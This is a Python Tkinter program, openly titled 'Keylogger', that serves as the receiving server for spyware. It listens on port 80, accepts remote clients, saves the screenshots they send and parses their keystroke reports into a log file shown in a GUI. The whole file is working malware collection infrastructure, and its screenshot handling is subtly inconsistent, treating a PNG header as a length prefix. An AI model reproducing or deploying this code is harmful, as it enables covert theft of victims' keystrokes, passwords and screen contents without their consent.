import socket
import threading
from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
import os
from datetime import datetime

# Constants for folders and files
screenshot_folder = 'screenshots'
keylogger_file = 'keylogger.txt'

# Create folders and files if they don't exist
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

if not os.path.exists(keylogger_file):
    open(keylogger_file, 'w').close()

# Tkinter setup
root = Tk()
root.resizable(False, False)
root.title("Keylogger")
root.geometry('700x650')
root.config(background="LightSteelBlue4")

# Function to filter and format keylogger data
def filter_and_format_keylogger_data(data):
    return data.replace('\n', '')

# Function to append data to terminal text area
def append_terminal_data(data):
    try:
        terminal_text.config(state=NORMAL)
        for line in data.split('\n'):
            if "Special key" in line:
                key = line.split(" ")[2].lower()
                special_char = special_keys_mapping.get(key, key)
                terminal_text.insert(END, special_char)
            else:
                terminal_text.insert(END, line)
        terminal_text.insert(END, '\n')
        terminal_text.config(state=DISABLED)
        terminal_text.see(END)
    except Exception as e:
        print(f"Error displaying data: {e}")


# Function to display keylogger.txt content
def display_keylogger_content():
    with open(keylogger_file, 'r') as file:
        keylogger_content = file.read()
        formatted_content = filter_and_format_keylogger_data(keylogger_content)
        return formatted_content

# Function to refresh keylogger display
def refresh_keylogger_display():
    keylogger_text.config(state=NORMAL)
    keylogger_text.delete(1.0, END)
    keylogger_text.insert(END, display_keylogger_content())
    keylogger_text.config(state=DISABLED)
    keylogger_text.see(END)  # This line should be present


# Function to clear keylogger file
def clear_keylogger_file():
    confirmation = messagebox.askyesno("Confirmation", "Are you sure you want to clear the keylogger data?")
    if confirmation:
        with open(keylogger_file, 'w') as file:
            file.write('')
        refresh_keylogger_display()

# Special key mappings
special_keys_mapping = {
    "space": " ",
    "enter": "\n",
    "tab": "   ",
}

# Tkinter UI setup
main_page = Frame(root, bg="gray30", width=700, height=600)
main_page.pack_propagate(False)
main_page.pack()

box_frame = Frame(main_page, bg="gray40")
box_frame.pack(pady=10, fill=BOTH, expand=True)

left_box = Frame(box_frame, bg="SkyBlue1", highlightthickness=2, highlightbackground="black")
left_box.pack(side=LEFT, padx=10, fill=BOTH, expand=True)

right_box = Frame(box_frame, bg="SkyBlue1", highlightthickness=2, highlightbackground="black")
right_box.pack(side=LEFT, padx=10, fill=BOTH, expand=True)

below_box = Frame(main_page, bg="gray40", width=7000, height=300, highlightthickness=2, highlightbackground="black")
below_box.pack(pady=10, fill=BOTH, expand=True)

scrollbar = Scrollbar(below_box)
scrollbar.pack(side=RIGHT, fill=Y)

terminal_text = Text(below_box, width=60, height=10, font=("Arial", 12), wrap=WORD, state=DISABLED, yscrollcommand=scrollbar.set)
terminal_text.pack(padx=10, pady=10, fill=BOTH, expand=True)

scrollbar.config(command=terminal_text.yview)

listbox_scrollbar = Scrollbar(left_box)
listbox_scrollbar.pack(side=RIGHT, fill=Y)

screenshot_listbox = Listbox(left_box, width=30, height=20, yscrollcommand=listbox_scrollbar.set)
screenshot_listbox.pack(padx=10, pady=10, fill=BOTH, expand=True)

listbox_scrollbar.config(command=screenshot_listbox.yview)

screenshot_canvas = Canvas(right_box, bg="gray70")
screenshot_canvas.pack(padx=10, pady=10, fill=BOTH, expand=True)

def load_screenshots():
    screenshot_listbox.delete(0, END)
    for file in os.listdir(screenshot_folder):
        if file.endswith('.png'):
            screenshot_listbox.insert(END, file)

def display_screenshot(event):
    selected_file = screenshot_listbox.get(screenshot_listbox.curselection())
    screenshot_path = os.path.join(screenshot_folder, selected_file)
    img = Image.open(screenshot_path)
    img.thumbnail((350, 350))
    img = ImageTk.PhotoImage(img)
    screenshot_canvas.image = img
    screenshot_canvas.create_image(0, 0, anchor=NW, image=img)

def open_screenshot_in_new_window(event):
    selected_file = screenshot_listbox.get(screenshot_listbox.curselection())
    screenshot_path = os.path.join(screenshot_folder, selected_file)
    new_window = Toplevel(root)
    new_window.title(selected_file)
    new_window.geometry('600x600')
    img = Image.open(screenshot_path)
    img = ImageTk.PhotoImage(img)
    img_label = Label(new_window, image=img)
    img_label.image = img
    img_label.pack()

def delete_selected_screenshot():
    selected_index = screenshot_listbox.curselection()
    if selected_index:
        selected_file = screenshot_listbox.get(selected_index)
        screenshot_path = os.path.join(screenshot_folder, selected_file)
        os.remove(screenshot_path)
        load_screenshots()
        screenshot_canvas.delete("all")

def delete_all_screenshots():
    for file in os.listdir(screenshot_folder):
        if file.endswith('.png'):
            os.remove(os.path.join(screenshot_folder, file))
    load_screenshots()
    screenshot_canvas.delete("all")

screenshot_listbox.bind('<<ListboxSelect>>', display_screenshot)
screenshot_listbox.bind('<Double-1>', open_screenshot_in_new_window)

load_screenshots()

delete_button = Button(left_box, text="Delete Selected", command=delete_selected_screenshot)
delete_button.pack(pady=5, padx=10)

delete_all_button = Button(left_box, text="Delete All", command=delete_all_screenshots)
delete_all_button.pack(pady=5, padx=10)

keylogger_label = Label(right_box, text="Keylogger Data:", font=("Arial", 14, "bold"), bg="gray40", fg="white")
keylogger_label.pack(pady=5)

keylogger_text = Text(right_box, height=10, width=40, wrap=WORD, state=DISABLED)
keylogger_text.pack(pady=5, padx=10, fill=BOTH, expand=True)

clear_button = Button(right_box, text="Clear Keylogger Data", command=clear_keylogger_file)
clear_button.pack(pady=5)

# Server setup
def start_keylogger_server():
    def handle_client(client_socket):
        while True:
            try:
                data = client_socket.recv(1024)
                if not data:
                    break
                if data.startswith(b'\x89PNG') or b'IDAT' in data:
                    handle_screenshot(client_socket, data)
                    load_screenshots()
                else:
                    decoded_data = data.decode(errors='replace')
                    append_terminal_data(decoded_data)
                    log_keystrokes(decoded_data)
            except Exception as e:
                print(f"Error receiving data: {e}")
                break
        client_socket.close()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '0.0.0.0'
    port = 80
    server_socket.bind((host, port))
    server_socket.listen(5)

    while True:
        client_socket, client_address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

def handle_screenshot(client_socket, initial_data):
    data_length = int.from_bytes(initial_data[:4], 'big')
    data = initial_data[4:]

    while len(data) < data_length:
        data += client_socket.recv(data_length - len(data))

    screenshot_path = os.path.join(screenshot_folder, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
    with open(screenshot_path, 'wb') as file:
        file.write(data)

def log_keystrokes(data):
    with open(keylogger_file, 'a') as file:
        for line in data.split('\n'):
            if "Key" in line and "pressed" in line:
                key = line.split(' ')[1].replace("'", "")
                if key != "key":
                    if key == "enter":
                        file.write('\n')
                    elif key == "space":
                        file.write(" ")  # Write space character
                    elif key == "tab":
                        file.write("   ")  # Write three spaces for tab
                    else:
                        file.write(key)

server_thread = threading.Thread(target=start_keylogger_server)
server_thread.daemon = True
server_thread.start()

refresh_keylogger_display()
root.mainloop()